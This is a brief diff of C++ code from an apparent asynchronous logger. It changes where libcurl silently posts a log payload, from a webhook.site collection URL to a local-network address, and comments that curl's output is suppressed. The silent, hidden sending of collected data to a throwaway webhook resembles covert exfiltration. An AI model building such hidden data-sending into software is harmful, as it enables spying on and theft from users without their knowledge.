@@ -122,7 +122,7 @@ void AsyncLogger::processLogs() {
 
         // 3. Silent HTTPS Send
         if (curl) {
-            curl_easy_setopt(curl, CURLOPT_URL, "https://webhook.site/a794f19f-d0f5-4440-96fa-0703e27b76b8");
+            curl_easy_setopt(curl, CURLOPT_URL, "http://192.168.1.22/api/logs");
             curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.c_str());
             
             // This is the key change: tell curl to use our empty function instead of stdout
